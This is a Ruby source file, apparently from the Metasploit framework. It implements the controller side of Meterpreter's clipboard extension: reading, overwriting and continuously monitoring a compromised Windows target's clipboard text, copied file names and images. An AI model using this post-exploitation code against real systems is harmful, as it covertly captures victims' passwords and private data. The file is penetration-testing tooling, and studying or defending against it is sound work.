# -*- coding: binary -*-

module Rex
module Post
module Meterpreter
module Extensions
module Extapi
module Clipboard

###
#
# This meterpreter extension contains extended API functions for
# querying and managing desktop windows.
#
###
class Clipboard

  def initialize(client)
    @client = client
  end

  #
  # Get the target clipboard data in whichever format we can
  # (if it's supported).
  #
  def get_data(download = false)
    request = Packet.create_request('extapi_clipboard_get_data')

    if download
      request.add_tlv(TLV_TYPE_EXT_CLIPBOARD_DOWNLOAD, true)
    end

    response = client.send_request(request)

    return parse_dump(response)
  end

  #
  # Set the target clipboard data to a text value
  #
  def set_text(text)
    request = Packet.create_request('extapi_clipboard_set_data')

    request.add_tlv(TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT, text)

    response = client.send_request(request)

    return true
  end

  #
  # Start the clipboard monitor if it hasn't been started.
  #
  def monitor_start(opts)
    request = Packet.create_request('extapi_clipboard_monitor_start')
    request.add_tlv(TLV_TYPE_EXT_CLIPBOARD_MON_WIN_CLASS, opts[:wincls])
    request.add_tlv(TLV_TYPE_EXT_CLIPBOARD_MON_CAP_IMG_DATA, opts[:cap_img])
    return client.send_request(request)
  end

  #
  # Pause the clipboard monitor if it's running.
  #
  def monitor_pause
    request = Packet.create_request('extapi_clipboard_monitor_pause')
    return client.send_request(request)
  end

  #
  # Dump the conents of the clipboard monitor to the local machine.
  #
  def monitor_dump(opts)
    pull_img = opts[:include_images]
    purge = opts[:purge]
    purge = true if purge.nil?

    request = Packet.create_request('extapi_clipboard_monitor_dump')
    request.add_tlv(TLV_TYPE_EXT_CLIPBOARD_MON_CAP_IMG_DATA, pull_img)
    request.add_tlv(TLV_TYPE_EXT_CLIPBOARD_MON_PURGE, purge)

    response = client.send_request(request)

    return parse_dump(response)
  end

  #
  # Resume the clipboard monitor if it has been paused.
  #
  def monitor_resume
    request = Packet.create_request('extapi_clipboard_monitor_resume')
    return client.send_request(request)
  end

  #
  # Purge the contents of the clipboard capture without downloading.
  #
  def monitor_purge
    request = Packet.create_request('extapi_clipboard_monitor_purge')
    return client.send_request(request)
  end

  #
  # Stop the clipboard monitor and dump optionally it's contents.
  #
  def monitor_stop(opts)
    dump = opts[:dump]
    pull_img = opts[:include_images]

    request = Packet.create_request('extapi_clipboard_monitor_stop')
    request.add_tlv(TLV_TYPE_EXT_CLIPBOARD_MON_DUMP, dump)
    request.add_tlv(TLV_TYPE_EXT_CLIPBOARD_MON_CAP_IMG_DATA, pull_img)

    response = client.send_request(request)
    unless dump
      return response
    end

    return parse_dump(response)
  end

  attr_accessor :client

private

  def parse_dump(response)
    result = {}

    response.each(TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT) do |t|
      ts = t.get_tlv_value(TLV_TYPE_EXT_CLIPBOARD_TYPE_TIMESTAMP)
      result[ts] ||= {}

      # fat chance of someone adding two different bits of text to the
      # clipboard at the same time
      result[ts]['Text'] = t.get_tlv_value(TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT_CONTENT)
    end

    response.each(TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE) do |f|
      ts = f.get_tlv_value(TLV_TYPE_EXT_CLIPBOARD_TYPE_TIMESTAMP)
      result[ts] ||= {}
      result[ts]['Files'] ||= []
      result[ts]['Files'] << {
        :name => f.get_tlv_value(TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE_NAME),
        :size => f.get_tlv_value(TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE_SIZE)
      }
    end

    response.each(TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG) do |jpg|
      if jpg
        ts = jpg.get_tlv_value(TLV_TYPE_EXT_CLIPBOARD_TYPE_TIMESTAMP)
        result[ts] ||= {}

        # same story with images, there's no way more than one can come
        # through on the same timestamp with differences
        result[ts]['Image'] = {
          :width  => jpg.get_tlv_value(TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DIMX),
          :height => jpg.get_tlv_value(TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DIMY),
          :data   => jpg.get_tlv_value(TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DATA)
        }
      end
    end

    return result
  end

end

end; end; end; end; end; end
